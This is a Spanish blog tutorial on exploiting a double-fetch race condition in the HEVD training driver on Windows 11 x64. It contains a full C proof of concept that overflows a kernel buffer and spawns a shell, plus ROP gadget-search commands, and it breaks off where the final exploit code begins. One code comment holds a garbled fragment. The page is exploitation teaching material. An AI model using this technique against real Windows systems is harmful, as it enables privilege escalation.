@@ -1,0 +1,617 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>0x08 - Race Conditions Moderno Del Windows Kernel // </title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0x08 - Race Conditions Moderno Del Windows Kernel">
+  <meta name="twitter:description" content="Con Windows 7 (x86) conquistado podemos proceder a intentar aprovechar el Race Condition en Windows 11 (x64).
+Comencemos.
+Table of Contents Ingeniería Inversa PoC Obtener Ejecución del Código Explotación Ingeniería Inversa Echemos una mirada al codigo vulnerable, y las respectivas estructuras utilizadas por la función del controlador.
+Veamos TriggerDoubleFetch() donde se encuentra la vulnerabilidad del Double Fetch Race Condition.
+Podemos ver que se hace referencia a nuestra información controlada en dos momentos diferentes, como antes, lo que significa que deberíamos poder activar la condición de carrera de la misma manera que antes, más específicamente el Double Fetch!">
+
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x08-race-conditions-moderno-del-windows-kernel/">
+  <meta property="og:site_name" content="wetw0rk">
+  <meta property="og:title" content="0x08 - Race Conditions Moderno Del Windows Kernel">
+  <meta property="og:description" content="Con Windows 7 (x86) conquistado podemos proceder a intentar aprovechar el Race Condition en Windows 11 (x64).
+Comencemos.
+Table of Contents Ingeniería Inversa PoC Obtener Ejecución del Código Explotación Ingeniería Inversa Echemos una mirada al codigo vulnerable, y las respectivas estructuras utilizadas por la función del controlador.
+Veamos TriggerDoubleFetch() donde se encuentra la vulnerabilidad del Double Fetch Race Condition.
+Podemos ver que se hace referencia a nuestra información controlada en dos momentos diferentes, como antes, lo que significa que deberíamos poder activar la condición de carrera de la misma manera que antes, más específicamente el Double Fetch!">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-01T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
+      <span class="app-header-title"></span>
+      <p> </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">0x08 - Race Conditions Moderno Del Windows Kernel</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Feb 1, 2025
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          10 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>Con Windows 7 (x86) conquistado podemos proceder a intentar aprovechar el Race Condition en Windows 11 (x64).</p>
+<p>Comencemos.</p>
+<h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#ingenier%C3%ADa-inversa">Ingeniería Inversa</a></li>
+<li><a href="#poc">PoC</a></li>
+<li><a href="#obtener-ejecuci%C3%B3n-del-c%C3%B3digo">Obtener Ejecución del Código</a></li>
+<li><a href="#explotaci%C3%B3n">Explotación</a></li>
+</ul>
+<h1 id="ingeniería-inversa">Ingeniería Inversa</h1>
+<p>Echemos una mirada al codigo vulnerable, y las respectivas estructuras utilizadas por la función del controlador.</p>
+<p><img src="/0x08-Modern-Windows-Kernel-Race-Conditions/handler.png" alt="alt text"></p>
+<p>Veamos <code>TriggerDoubleFetch()</code> donde se encuentra la vulnerabilidad del Double Fetch Race Condition.</p>
+<p><img src="/0x08-Modern-Windows-Kernel-Race-Conditions/vuln.png" alt="alt text"></p>
+<p>Podemos ver que se hace referencia a nuestra información controlada en dos momentos diferentes, como antes, lo que significa que deberíamos poder activar la condición de carrera de la misma manera que antes, más específicamente el Double Fetch! ¡Hagamos una prueba de concepto!</p>
+<h1 id="poc">PoC</h1>
+<p>Con toda esa información (más nuestra experiencia en Windows 7) podemos seguir adelante y elaborar una PoC.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;processthreadsapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* IOCTL */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DOUBLE_FETCH_IOCTL 0x222037
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Max threads */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define NUM_THREADS 5
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit Buffer */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER 0x1000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Double Fetch */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _DOUBLE_FETCH
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> Buffer;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> Size;
+</span></span><span style="display:flex;"><span>} DOUBLE_FETCH, <span style="color:#f92672">*</span>PDOUBLE_FETCH;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure for threads */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _IRP_ARGS
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD;
+</span></span><span style="display:flex;"><span>  PDOUBLE_FETCH pDoubleFetch;
+</span></span><span style="display:flex;"><span>} IRP_ARGS, <span style="color:#f92672">*</span>PIRP_ARGS;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* TriggerRaceCondition():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Since driver reads from userland twice we can overwrite the existing condition that bypasses the checkslmgr -rearm
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     at runtime. If we win the race we successfully trigger a buffer overflow! */</span>
+</span></span><span style="display:flex;"><span>DWORD WINAPI <span style="color:#a6e22e">TriggerRaceCondition</span>(LPVOID lpParameters)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  PIRP_ARGS pIrpArgs <span style="color:#f92672">=</span> (PIRP_ARGS)lpParameters;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch<span style="color:#f92672">-&gt;</span>Size <span style="color:#f92672">=</span> BUFFER;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* TriggerWorkingCondition():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     As we saw in TriggerDoubleFetch() in order to reach the RtlCopyMemory() aka wrapper for memcpy() we need
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     our buffer to be under the sizeof(KernelBuffer). This function sends an IOCTL to ensure we meed that
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     condition. */</span>
+</span></span><span style="display:flex;"><span>DWORD WINAPI <span style="color:#a6e22e">TriggerWorkingCondition</span>(LPVOID lpParameters)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  PIRP_ARGS pIrpArgs <span style="color:#f92672">=</span> (PIRP_ARGS)lpParameters;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Spraying DoubleFetchObject(s): %p, Size: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch,
+</span></span><span style="display:flex;"><span>                                                                  pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch<span style="color:#f92672">-&gt;</span>Size);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch<span style="color:#f92672">-&gt;</span>Size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">DeviceIoControl</span>(pIrpArgs<span style="color:#f92672">-&gt;</span>hHEVD,
+</span></span><span style="display:flex;"><span>                    DOUBLE_FETCH_IOCTL,
+</span></span><span style="display:flex;"><span>                    pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch,
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">sizeof</span>(DOUBLE_FETCH),
+</span></span><span style="display:flex;"><span>                    NULL,
+</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                    NULL);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GenerateExploitBuffer():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GenerateExploitBuffer</span>(LPVOID lpvBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>payload <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(lpvBuffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> (BUFFER <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>)); i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Double Fetch */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  LPVOID lpvMemoryAllocation <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  HANDLE hThreadWork[NUM_THREADS] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  HANDLE hThreadRace[NUM_THREADS] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  PIRP_ARGS pIrpArgs <span style="color:#f92672">=</span> (PIRP_ARGS)<span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(IRP_ARGS));
+</span></span><span style="display:flex;"><span>  PDOUBLE_FETCH pDoubleFetchObject <span style="color:#f92672">=</span> (PDOUBLE_FETCH)<span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(DOUBLE_FETCH));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvMemoryAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
+</span></span><span style="display:flex;"><span>                                     BUFFER,
+</span></span><span style="display:flex;"><span>                                     (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                                     PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvMemoryAllocation <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate exploitation buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Successfully allocated exploitation buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Fill up the buffer */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GenerateExploitBuffer</span>(lpvMemoryAllocation);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Setup the Double Fetch object */</span>
+</span></span><span style="display:flex;"><span>  pDoubleFetchObject<span style="color:#f92672">-&gt;</span>Buffer <span style="color:#f92672">=</span> lpvMemoryAllocation;
+</span></span><span style="display:flex;"><span>  pDoubleFetchObject<span style="color:#f92672">-&gt;</span>Size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Setup the base IRP argument(s) */</span>
+</span></span><span style="display:flex;"><span>  pIrpArgs<span style="color:#f92672">-&gt;</span>hHEVD <span style="color:#f92672">=</span> hHEVD;
+</span></span><span style="display:flex;"><span>  pIrpArgs<span style="color:#f92672">-&gt;</span>pDoubleFetch <span style="color:#f92672">=</span> pDoubleFetchObject;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Start the race!! */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Off to the races</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_THREADS; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    hThreadWork[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateThread</span>(NULL,  <span style="color:#ae81ff">0</span>, TriggerWorkingCondition, pIrpArgs, <span style="color:#ae81ff">0</span>, NULL);
+</span></span><span style="display:flex;"><span>    hThreadRace[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateThread</span>(NULL,  <span style="color:#ae81ff">0</span>, TriggerRaceCondition, pIrpArgs, <span style="color:#ae81ff">0</span>, NULL);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">WaitForMultipleObjects</span>(NUM_THREADS, hThreadWork, TRUE, <span style="color:#ae81ff">10000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_THREADS; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TerminateThread</span>(hThreadWork[i], <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hThreadWork[i]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TerminateThread</span>(hThreadRace[i], <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hThreadRace[i]);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation successful, enjoy de shell!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Una vez enviado, podemos ver que hemos sobrescrito una dirección de regreso y hemos obtenido control sobre el puntero de instrucción :)</p>
+<p><img src="/0x08-Modern-Windows-Kernel-Race-Conditions/crash.png" alt="alt text"></p>
+<h1 id="obtener-ejecución-del-código">Obtener Ejecución del Código</h1>
+<p>Lo más probable es que tengamos espacio más que suficiente antes del desbordamiento del búfer para inyectar una cadena ROP para evitar las protecciones de la memoria. Después de ver que la sobrescritura se produjo en 2064 bytes podemos proceder a buscar gadgets.</p>
+<pre tabindex="0"><code>C:\&gt;rp-win.exe --rop=100 --va=0 --file C:\Windows\System32\ntoskrnl.exe &gt; rop.txt
+</code></pre><p>No olvides convertir a ascii si es necesario ;)</p>
+<pre tabindex="0"><code>$ iconv -f utf-16 -t us-ascii//TRANSLIT rop.txt &gt; rop_ascii.txt
+</code></pre><p>Después de mirar nuestras opciones, no vemos muchos gadgtes <code>sub rsp</code> e incluso si logramos encontrar uno&hellip; parece que el búfer que escribimos está contaminado con información adicionales que no enviamos.</p>
+<p><img src="/0x08-Modern-Windows-Kernel-Race-Conditions/pain.png" alt="alt text"></p>
+<p>Entonces, si no podemos retroceder, saltemos adelante! Como podemos escribir tanto como queramos, ¡escribamos nuestra cadena ROP despues de la sobrescritura de la dirección de regreso!</p>
+<h1 id="explotación">Explotación</h1>
+<p>Abajo está el código PoC final:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
